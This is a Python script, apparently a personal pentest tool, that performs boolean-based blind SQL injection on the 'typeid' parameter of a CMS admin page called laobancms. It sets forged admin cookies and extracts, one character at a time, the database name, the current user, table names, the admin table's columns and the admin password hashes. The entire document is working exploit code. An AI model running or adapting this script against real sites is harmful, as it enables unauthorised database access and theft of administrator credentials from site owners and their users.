#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Date    : 2018-08-01 15:07:04
# @Author  : Porlock
# @Blog    : https://www.porlockz.com
# @Version : python3
# @use     : sqli
import requests
import string 
import time

# 配置
# config

url = 'http://127.0.0.1/admin/art.php'
cookies = {'id': '1', 'guanliyuan':'laobancms'}
strset = string.ascii_letters + string.digits
connect = requests.session()
# payload={'typeid': "1 and left(database(),1)='l'"}


# 数据库
# current database name

databasename = ''
for i in range(1,10):
	typeid="1 and left(database(),"+str(i)+")=\'"+databasename
	for test in strset:
		typeid_save = typeid
		typeid = typeid + test + "\'"
		payload={'typeid': typeid}
		reponse = connect.get(url,params=payload,cookies=cookies)
		if (reponse.text.find('zhaiyao') != -1):
			databasename = databasename + test
			print('The DataBase Name is : '+databasename)
			break
		else:
			typeid = typeid_save
	if (typeid == typeid_save):
		break

# 当前用户select USER()
# current database user

username = ''
for i in range(1,5):
	typeid="1 and left(user(),"+str(i)+")=\'"+username
	for test in strset:
		typeid_save = typeid
		typeid = typeid + test + "\'"
		payload={'typeid': typeid}
		reponse = connect.get(url,params=payload,cookies=cookies)
		if (reponse.text.find('zhaiyao') != -1):
			username = username + test
			print('The Current User is : '+username)
			break
		else:
			typeid = typeid_save
	if (typeid == typeid_save):
		break

# 爆数据库表名
# table name

for i in range(0,6):
	tablename = ''
	for j in range(1,8):
		typeid="1 and left((select table_name from information_schema.tables where table_schema=database() limit "+str(i)+",1),"+str(j)+")=\'"+tablename
		for test in strset:
			typeid_save = typeid
			typeid = typeid + test + "\'"
			payload={'typeid': typeid}
			reponse = connect.get(url,params=payload,cookies=cookies)
			if (reponse.text.find('zhaiyao') != -1):
				tablename = tablename + test
				print('One Of Table Name is : '+tablename)
				break
			else:
				typeid = typeid_save
		if (typeid == typeid_save):
			print('------------------')
			break

# 爆admin列名
# admin's columns

for i in range(0,8):
	columnname = ''
	for j in range(1,20):
		typeid="1 and left((select column_name from information_schema.columns where table_schema=database() and table_name=\'admin\' limit "+str(i)+",1),"+str(j)+")=\'"+columnname
		for test in strset:
			typeid_save = typeid
			typeid = typeid + test + "\'"
			payload={'typeid': typeid}
			reponse = connect.get(url,params=payload,cookies=cookies)
			if (reponse.text.find('zhaiyao') != -1):
				columnname = columnname + test
				print('One Of Columns Name is : '+columnname)
				break
			else:
				typeid = typeid_save
		if (typeid == typeid_save):
			print('------------------')
			break

# 爆数据
# admin's md5

for i in range(0,2):
	data = ''
	for j in range(1,64):
		typeid="1 and left((select mima from laobancms.admin limit "+str(i)+",1),"+str(j)+")=\'"+data
		for test in strset:
			typeid_save = typeid
			typeid = typeid + test + "\'"
			payload={'typeid': typeid}
			reponse = connect.get(url,params=payload,cookies=cookies)
			if (reponse.text.find('zhaiyao') != -1):
				data = data + test
				print('One of the DATA : '+data)
				break
			else:
				typeid = typeid_save
		if (typeid == typeid_save):
			print('------------------')
			break
